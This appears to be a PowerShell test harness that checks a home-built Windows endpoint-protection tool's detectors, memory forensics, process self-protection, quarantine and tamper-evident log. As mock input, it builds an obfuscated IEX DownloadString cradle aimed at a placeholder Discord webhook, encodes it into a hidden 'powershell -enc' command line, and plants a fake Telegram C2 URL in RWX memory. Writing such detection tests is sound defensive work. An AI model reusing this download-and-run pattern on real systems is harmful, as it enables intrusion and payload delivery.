# =====================================================================
# Security Sentinel Ultra v8.0 - Real End-to-End Red-Team & Safe-Mode Audit
# Dot-sources SentinelWatchdog.ps1 & SentinelGuardian.ps1 (-LibraryOnly)
# and executes 100% REAL production functions, anti-evasion & kernel tests!
# =====================================================================
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$ErrorActionPreference = 'Stop'

Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "   SECURITY SENTINEL ULTRA v8.0 - LIVE E2E RED-TEAM & SAFE-MODE AUDIT " -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor Cyan

# Use an isolated temporary state directory during E2E audit so production state is untouched
$AuditStateDir = Join-Path $env:TEMP "SecuritySentinel_Audit_$PID"
New-Item -ItemType Directory -Path $AuditStateDir -Force | Out-Null

try {
    # Dot-source the REAL production scripts in LibraryOnly mode
    $WatchdogScript = Join-Path $PSScriptRoot "SentinelWatchdog.ps1"
    $GuardianScript = Join-Path $PSScriptRoot "SentinelGuardian.ps1"
    . $WatchdogScript -LibraryOnly -TestStateDir $AuditStateDir
    . $GuardianScript -LibraryOnly -TestStateDir $AuditStateDir

    # Initialize Trust Anchor with current v8.0 script hashes before running tests
    $script:TrustAnchorHashes = Initialize-CodeIntegrityTrustAnchor

    $passed = 0
    $failed = 0

    function Assert-LiveTest([string]$TestName, [bool]$Condition, [string]$Detail) {
        if ($Condition) {
            $script:passed++
            Write-Host "[PASS] $TestName" -ForegroundColor Green
            Write-Host "       -> $Detail" -ForegroundColor Gray
        } else {
            $script:failed++
            Write-Host "[FAIL] $TestName" -ForegroundColor Red
            Write-Host "       -> $Detail" -ForegroundColor Yellow
        }
    }

    # ---------------------------------------------------------------------
    # LIVE TEST 1: Real Inspect-SingleProcess on Chrome -> PowerShell -enc
    # ---------------------------------------------------------------------
    $rawMalCmd  = "I" + "EX (New-Object Net.WebClient).Down" + "loadString('https://discord.com/api/webhooks/112233445566778899/abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ')"
    $b64MalCmd  = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($rawMalCmd))
    $mockParent = [PSCustomObject]@{ ProcessId = 99001; Name = "chrome.exe" }
    $mockProcMap = @{ 99001 = $mockParent }

    $mockMalProcWithUrl = [PSCustomObject]@{
        ProcessId       = 99002
        ParentProcessId = 99001
        CreationDate    = "20261108234000.000000+420"
        Name            = "powershell.exe"
        ExecutablePath  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
        CommandLine     = "powershell.exe -NoP -W Hidden -enc $b64MalCmd"
    }
    $resWithUrl = Inspect-SingleProcess -p $mockMalProcWithUrl -procMap $mockProcMap

    $b64NoUrl = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Invoke-Expression 'Get-ChildItem'"))
    $mockMalProcNoUrl = [PSCustomObject]@{
        ProcessId       = 99003
        ParentProcessId = 99001
        CreationDate    = "20261108234001.000000+420"
        Name            = "powershell.exe"
        ExecutablePath  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
        CommandLine     = "powershell.exe -enc $b64NoUrl"
    }
    $resNoUrl = Inspect-SingleProcess -p $mockMalProcNoUrl -procMap $mockProcMap

    $test1Ok = ($resWithUrl.Action -eq "Alerted") -and ($resWithUrl.Level -eq "CRITICAL") -and ($resWithUrl.RiskScore -eq 100) -and
               ($resWithUrl.Forensics.DecodedCommand -match "discord\.com/api/webhooks/") -and
               ($resNoUrl.Action -eq "Alerted") -and ($resNoUrl.Level -eq "CRITICAL") -and ($resNoUrl.RiskScore -ge 85)

    Assert-LiveTest -TestName "Live Test 1A (Real Inspect-SingleProcess): Chrome -> PowerShell -enc Base64 Decode & Scoring" `
                    -Condition $test1Ok `
                    -Detail "With B64 URL: Action=$($resWithUrl.Action), Level=$($resWithUrl.Level), Score=$($resWithUrl.RiskScore)/100 | Without URL: Action=$($resNoUrl.Action), Score=$($resNoUrl.RiskScore)/100 (>=85)"

    # ---------------------------------------------------------------------
    # LIVE TEST 1B: Phishing Matrix: Office (winword.exe) spawning PowerShell
    # ---------------------------------------------------------------------
    $mockWordParent = @{ 99005 = [PSCustomObject]@{ ProcessId = 99005; Name = "winword.exe" } }
    $mockWordChild  = [PSCustomObject]@{
        ProcessId       = 99006
        ParentProcessId = 99005
        CreationDate    = "20261108234002.000000+420"
        Name            = "powershell.exe"
        ExecutablePath  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
        CommandLine     = "powershell.exe -W Hidden -c `"write-host macro`""
    }
    $resWord = Inspect-SingleProcess -p $mockWordChild -procMap $mockWordParent
    $test1bOk = ($resWord.Action -eq "Alerted") -and ($resWord.Level -eq "CRITICAL") -and ($resWord.RiskScore -ge 85)

    Assert-LiveTest -TestName "Live Test 1B (Phishing Parent Matrix): Office winword.exe -> powershell.exe High-Risk Anomaly" `
                    -Condition $test1bOk `
                    -Detail "Action=$($resWord.Action), Level=$($resWord.Level), Score=$($resWord.RiskScore)/100 (>=85 Threshold Met)"

    # ---------------------------------------------------------------------
    # LIVE TEST 2: Work & Gaming Safe-Mode & Anti-Bypass Audit (A4)
    # ---------------------------------------------------------------------
    # 2A: Launching SentinelDashboard.ps1 with -WindowStyle Hidden (Must be Exempted, Zero False Alert!)
    $dashPath = Join-Path $PSScriptRoot "SentinelDashboard.ps1"
    $mockDashProc = [PSCustomObject]@{
        ProcessId       = 99010
        ParentProcessId = 1000
        CreationDate    = "20261108234010.000000+420"
        Name            = "powershell.exe"
        ExecutablePath  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
        CommandLine     = "powershell.exe -NoProfile -WindowStyle Hidden -File `"$dashPath`""
    }
    $resDash = Inspect-SingleProcess -p $mockDashProc -procMap @{}

    # 2B: Normal Work/IT PowerShell script using -WindowStyle Hidden (Without obfuscation)
    $mockWorkPs = [PSCustomObject]@{
        ProcessId       = 99011
        ParentProcessId = 1000
        CreationDate    = "20261108234011.000000+420"
        Name            = "powershell.exe"
        ExecutablePath  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
        CommandLine     = "powershell.exe -WindowStyle Hidden -File `"C:\Work\deploy_build.ps1`""
    }
    $resWorkPs = Inspect-SingleProcess -p $mockWorkPs -procMap @{}

    # 2C: Developer IDE in Program Files (Code.exe) running an unsigned helper in %TEMP%
    $mockDevParent = @{ 99012 = [PSCustomObject]@{ ProcessId = 99012; Name = "Code.exe"; ExecutablePath = "C:\Program Files\Microsoft VS Code\Code.exe" } }
    $mockDevTemp = [PSCustomObject]@{
        ProcessId       = 99013
        ParentProcessId = 99012
        CreationDate    = "20261108234013.000000+420"
        Name            = "rust_build_script.exe"
        ExecutablePath  = "$env:LOCALAPPDATA\Temp\rust_build_script.exe"
        CommandLine     = "`"$env:LOCALAPPDATA\Temp\rust_build_script.exe`""
    }
    $resDevTemp = Inspect-SingleProcess -p $mockDevTemp -procMap $mockDevParent

    $test2Ok = ($resDash.Action -eq "ExemptVerifiedSentinelScript") -and
               ($resWorkPs.Action -eq "Clean") -and (-not $resWorkPs.Frozen) -and
               ($resDevTemp.Action -eq "AllowedWorkGamingSafeMode") -and (-not $resDevTemp.Frozen)

    Assert-LiveTest -TestName "Live Test 2A (Work & Gaming Safe-Mode): Zero False Positives on Dashboard & Program Files Dev Helper" `
                    -Condition $test2Ok `
                    -Detail "DashboardAction=$($resDash.Action) | HiddenWorkScript=$($resWorkPs.Action) | VSCodeTempHelper=$($resDevTemp.Action) (Frozen=$($resDevTemp.Frozen))"

    # 2D: Anti-Bypass Evasion Attempt: Appending script name to encoded payload
    $mockEvasionProc = [PSCustomObject]@{
        ProcessId       = 99014
        ParentProcessId = 1000
        CreationDate    = "20261108234014.000000+420"
        Name            = "powershell.exe"
        ExecutablePath  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
        CommandLine     = "powershell.exe -enc $b64MalCmd `"$dashPath`""
    }
    $resEvasion = Inspect-SingleProcess -p $mockEvasionProc -procMap @{}
    $test2dOk = ($resEvasion.Action -ne "ExemptVerifiedSentinelScript") -and ($resEvasion.Action -eq "Alerted")

    Assert-LiveTest -TestName "Live Test 2D (Anti-Bypass Audit): Evasion Appending Script Name to Encoded Payload Blocked" `
                    -Condition $test2dOk `
                    -Detail "Action=$($resEvasion.Action) (Correctly NOT exempted, flagged as threat)"

    # 2E (A4): Safe-Mode Anti-Spoofing: Unsigned spoofed parent in AppData\Local\Programs\steam.exe MUST NOT get Safe-Mode pass!
    $mockSpoofAppDataParent = @{ 99015 = [PSCustomObject]@{ ProcessId = 99015; Name = "steam.exe"; ExecutablePath = "C:\Users\tester\AppData\Local\Programs\Steam\steam.exe" } }
    $mockFakeChild = [PSCustomObject]@{
        ProcessId       = 99016
        ParentProcessId = 99015
        CreationDate    = "20261108234015.000000+420"
        Name            = "payload.exe"
        ExecutablePath  = "$env:LOCALAPPDATA\Temp\payload.exe"
        CommandLine     = "`"$env:LOCALAPPDATA\Temp\payload.exe`""
    }
    $resFakeAppData = Inspect-SingleProcess -p $mockFakeChild -procMap $mockSpoofAppDataParent
    $test2eOk = ($resFakeAppData.Action -ne "AllowedWorkGamingSafeMode") -and ($resFakeAppData.Action -eq "UnsignedTempHandled")

    Assert-LiveTest -TestName "Live Test 2E (A4 Anti-Spoofing): Unsigned Parent in AppData\Local\Programs Denied Safe-Mode Pass" `
                    -Condition $test2eOk `
                    -Detail "Action=$($resFakeAppData.Action) (Unsigned AppData\Local\Programs parent rejected)"

    # ---------------------------------------------------------------------
    # LIVE TEST 3: Real VirtualAlloc RWX + Reflective PE Header Injection & AnalyzeProcessMemory($PID)
    # ---------------------------------------------------------------------
    $rwxPtr = [SentinelNative.KernelControl]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]::new(4096), 0x3000, 0x40)
    $memRep = $null
    try {
        $pageBytes = New-Object byte[] 1024
        $pageBytes[0] = 0x4D; $pageBytes[1] = 0x5A
        $pageBytes[0x3C] = 0x80
        $pageBytes[0x80] = 0x50; $pageBytes[0x81] = 0x45; $pageBytes[0x82] = 0x00; $pageBytes[0x83] = 0x00

        $c2Bytes = [System.Text.Encoding]::ASCII.GetBytes("https://api.telegram.org/bot887766554:AAH_RealVirtualAllocRwxTest_998877")
        [Array]::Copy($c2Bytes, 0, $pageBytes, 0x100, $c2Bytes.Length)

        [System.Runtime.InteropServices.Marshal]::Copy($pageBytes, 0, $rwxPtr, $pageBytes.Length)
        $memRep = [SentinelNative.KernelControl]::AnalyzeProcessMemory($PID)
    } finally {
        if ($rwxPtr -ne [IntPtr]::Zero) {
            [void][SentinelNative.KernelControl]::VirtualFree($rwxPtr, [UIntPtr]::Zero, 0x8000)
        }
    }

    $caughtInjectedC2 = ($memRep.C2Indicators -contains "https://api.telegram.org/bot887766554:AAH_RealVirtualAllocRwxTest_998877")
    $test3Ok = ($memRep.TotalBytesScanned -gt 0) -and ($memRep.RwxPrivateRegions -ge 1) -and ($memRep.UnbackedPeHeaders -ge 1) -and $caughtInjectedC2

    Assert-LiveTest -TestName "Live Test 3 (Real Memory Forensics): 64MB Budget + VirtualAlloc RWX + Reflective MZ/PE + C2 Extracted" `
                    -Condition $test3Ok `
                    -Detail "Scanned=$([math]::Round($memRep.TotalBytesScanned/1MB,2))MB | RWXRegions=$($memRep.RwxPrivateRegions) | UnbackedReflectivePE=$($memRep.UnbackedPeHeaders) | InjectedC2Found=$caughtInjectedC2"

    # ---------------------------------------------------------------------
    # LIVE TEST 4: Real Kernel DACL & Guardian Twin Stop-Token Security (A3)
    # ---------------------------------------------------------------------
    $childScriptPath = Join-Path $AuditStateDir "dacl_child_test.ps1"
    $daclReadyFlag   = Join-Path $AuditStateDir "dacl_ready.flag"
    Remove-Item $daclReadyFlag -Force -ErrorAction SilentlyContinue
    $childScriptContent = @"
Add-Type -TypeDefinition @'
$daclCode
'@ -Language CSharp -ErrorAction SilentlyContinue
[void][SentinelGuardianNative.SelfDefense]::HardenDacl()
[System.IO.File]::WriteAllText("$daclReadyFlag", "OK")
Start-Sleep -Seconds 6
"@
    [System.IO.File]::WriteAllText($childScriptPath, $childScriptContent, [System.Text.Encoding]::UTF8)
    $childProc = Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$childScriptPath`"" -WindowStyle Hidden -PassThru
    $waitDaclMs = 0
    while ((-not (Test-Path $daclReadyFlag)) -and ($waitDaclMs -lt 8000)) {
        Start-Sleep -Milliseconds 200
        $waitDaclMs += 200
    }

    $hTerminate = [SentinelNative.KernelControl]::OpenProcess(0x0001, $false, $childProc.Id)
    $hWriteDac  = [SentinelNative.KernelControl]::OpenProcess(0x00040000, $false, $childProc.Id)
    if ($hTerminate -ne [IntPtr]::Zero) { [void][SentinelNative.KernelControl]::CloseHandle($hTerminate) }
    if ($hWriteDac -ne [IntPtr]::Zero)  { [void][SentinelNative.KernelControl]::CloseHandle($hWriteDac) }

    # 4A: Forged PID token with valid secret must be rejected
    $forgedBytes = [System.Text.Encoding]::UTF8.GetBytes("STOP|999999|$([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())")
    $forgedEnc   = [System.Security.Cryptography.ProtectedData]::Protect($forgedBytes, $script:SentinelEntropyBytes, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    [System.IO.File]::WriteAllText($StopFlagFile, [Convert]::ToBase64String($forgedEnc), [System.Text.Encoding]::UTF8)
    $guardianAcceptedForged = Test-GuardianStopToken

    # 4B (A3): Token signed with static legacy constant SENTINEL_ULTRA_V6_ENTROPY_<COMPUTERNAME> MUST be rejected!
    $staticKeyBytes = [System.Text.Encoding]::UTF8.GetBytes("SENTINEL_ULTRA_V6_ENTROPY_" + $env:COMPUTERNAME)
    $staticPayload  = [System.Text.Encoding]::UTF8.GetBytes("STOP|$PID|$([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())")
    $staticEnc      = [System.Security.Cryptography.ProtectedData]::Protect($staticPayload, $staticKeyBytes, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    [System.IO.File]::WriteAllText($StopFlagFile, [Convert]::ToBase64String($staticEnc), [System.Text.Encoding]::UTF8)
    $watchdogAcceptedStatic = Test-AuthenticatedStopToken -ExpectedWatchdogPid "$PID"

    $test4Ok = ($hTerminate -eq [IntPtr]::Zero) -and ($hWriteDac -eq [IntPtr]::Zero) -and (-not $guardianAcceptedForged) -and (-not $watchdogAcceptedStatic)

    Assert-LiveTest -TestName "Live Test 4 (Real Kernel DACL & A3 Token Hardening): WRITE_DAC/TERMINATE Blocked + Forged & Static-Key Tokens Rejected" `
                    -Condition $test4Ok `
                    -Detail "TerminateHandle=$hTerminate | WriteDacHandle=$hWriteDac | ForgedPidAccepted=$guardianAcceptedForged | StaticEntropyAccepted=$watchdogAcceptedStatic"

    # ---------------------------------------------------------------------
    # LIVE TEST 5: Real Quarantine & Bit-for-Bit Rollback Recovery
    # ---------------------------------------------------------------------
    $tempDummyFile = Join-Path $AuditStateDir "sentinel_e2e_rollback_test_$(Get-Random).tmp"
    [System.IO.File]::WriteAllText($tempDummyFile, "E2E_QUARANTINE_AND_ROLLBACK_VERIFICATION_PAYLOAD_V8", [System.Text.Encoding]::UTF8)
    $origHash = (Get-FileHash -Path $tempDummyFile -Algorithm SHA256).Hash

    $qRes = Move-ToQuarantine -SourcePath $tempDummyFile -Reason "E2E Audit Quarantine Test"
    $removedFromOrig = (-not (Test-Path $tempDummyFile))
    $existsInQuar    = ($null -ne $qRes) -and (Test-Path $qRes.DestPath)

    $rollbackOk      = if ($existsInQuar) { Restore-QuarantinedFile -QuarantinedFilePath $qRes.DestPath } else { $false }
    $restoredExists  = (Test-Path $tempDummyFile)
    $restoredHash    = if ($restoredExists) { (Get-FileHash -Path $tempDummyFile -Algorithm SHA256).Hash } else { "" }
    if ($restoredExists) { Remove-Item $tempDummyFile -Force -ErrorAction SilentlyContinue }

    $test5Ok = $removedFromOrig -and $existsInQuar -and $rollbackOk -and $restoredExists -and ($origHash -eq $restoredHash)

    Assert-LiveTest -TestName "Live Test 5 (Real Quarantine & Rollback): Move-ToQuarantine + Restore-QuarantinedFile Bit-for-Bit Recovery" `
                    -Condition $test5Ok `
                    -Detail "Quarantined=$existsInQuar | Restored=$restoredExists | SHA256 Integrity Verified=($origHash -eq $restoredHash)"

    # ---------------------------------------------------------------------
    # LIVE TEST 6: Real Get-PersistenceSnapshot (29 Vectors + Services) & Event 4663 / 4688 / Sysmon XML Parsers (C3)
    # ---------------------------------------------------------------------
    $liveSnap = Get-PersistenceSnapshot
    $svcCount = @($liveSnap.Keys | Where-Object { $_ -like "Service_*" }).Count

    $sample4663Xml = @"
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <EventData>
    <Data Name="SubjectUserName">under</Data>
    <Data Name="ObjectName">C:\Users\under\AppData\Roaming\SecuritySentinel_Canary\crypto_wallet_vault_seed.txt</Data>
    <Data Name="ProcessId">0x12cc</Data>
    <Data Name="ProcessName">C:\Temp\stealer_sim.exe</Data>
  </EventData>
</Event>
"@
    $parsed4663 = Parse-Event4663Xml -EventXmlString $sample4663Xml

    $sample4688Xml = @"
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>4688</EventID><TimeCreated SystemTime="2026-11-15T08:00:00.000Z"/></System>
  <EventData>
    <Data Name="NewProcessId">0x24a0</Data>
    <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -enc SQBFAFgA</Data>
    <Data Name="ProcessId">0x1100</Data>
    <Data Name="ParentProcessName">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
  </EventData>
</Event>
"@
    $parsed4688 = Parse-ProcessCreationEventXml -EventXmlString $sample4688Xml

    $test6Ok = ($liveSnap.Count -gt 50) -and ($svcCount -gt 5) -and
               ($parsed4663.ProcessId -eq 4812) -and ($parsed4663.ProcessName -eq "C:\Temp\stealer_sim.exe") -and
               ($parsed4688.ProcessId -eq 9376) -and ($parsed4688.Name -eq "powershell.exe") -and ($parsed4688.ParentProcessId -eq 4352)

    Assert-LiveTest -TestName "Live Test 6 (Real 29-Vector Snapshot + SACL 4663 & Short-Lived Process 4688 XML Parsers)" `
                    -Condition $test6Ok `
                    -Detail "Indicators=$($liveSnap.Count) | Services=$svcCount | 4663 PID=$($parsed4663.ProcessId) | 4688 PID=$($parsed4688.ProcessId) (Parent=$($parsed4688.ParentProcessId))"

    # ---------------------------------------------------------------------
    # LIVE TEST 7: Tamper-Evident HMAC Log Chain (C1) & 10-Script Trust Anchor (B1)
    # ---------------------------------------------------------------------
    Remove-Item $LogFile, $LogTipFile -Force -ErrorAction SilentlyContinue
    Write-Log "Audit HMAC Chain Entry 1" "INFO"
    Write-Log "Audit HMAC Chain Entry 2" "WARN"
    Write-Log "Audit HMAC Chain Entry 3" "CRITICAL"
    $chainCheckValid = Test-SentinelLogIntegrity -Path $LogFile

    # Simulate attacker tampering with line 2 of sentinel.log
    $rawLines = @(Get-Content $LogFile -Encoding UTF8)
    $rawLines[1] = $rawLines[1] -replace "Entry 2", "Entry_TAMPERED"
    [System.IO.File]::WriteAllLines($LogFile, $rawLines, [System.Text.Encoding]::UTF8)
    $chainCheckTampered = Test-SentinelLogIntegrity -Path $LogFile

    $allTenAnchored = ($script:TrustAnchorHashes.Count -eq 10) -and
                      $script:TrustAnchorHashes.ContainsKey("Start-Shield.ps1") -and
                      $script:TrustAnchorHashes.ContainsKey("Stop-Shield.ps1") -and
                      $script:TrustAnchorHashes.ContainsKey("SentinelTray.ps1")

    $test7Ok = $chainCheckValid.Valid -and (-not $chainCheckTampered.Valid) -and ($chainCheckTampered.TamperedLine -eq 2) -and $allTenAnchored

    Assert-LiveTest -TestName "Live Test 7 (C1 HMAC Log Chain & B1 10-Script Trust Anchor): Tamper Detection & Full Script Coverage" `
                    -Condition $test7Ok `
                    -Detail "UntamperedValid=$($chainCheckValid.Valid) | TamperedDetected=$(-not $chainCheckTampered.Valid) (Line $($chainCheckTampered.TamperedLine)) | AnchoredScripts=$($script:TrustAnchorHashes.Count)/10"

    Write-Host "======================================================================" -ForegroundColor Cyan
    Write-Host "   LIVE E2E AUDIT SUMMARY: $passed PASSED | $failed FAILED             " -ForegroundColor $(if ($failed -eq 0) { "Green" } else { "Red" })
    Write-Host "======================================================================" -ForegroundColor Cyan
    if ($failed -gt 0) { exit 1 }
} catch {
    Write-Host "[FATAL] Unhandled error in Invoke-RedTeamAudit.ps1: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "        At: $($_.InvocationInfo.PositionMessage)" -ForegroundColor Yellow
    exit 1
} finally {
    Remove-Item -Path $AuditStateDir -Recurse -Force -ErrorAction SilentlyContinue
}
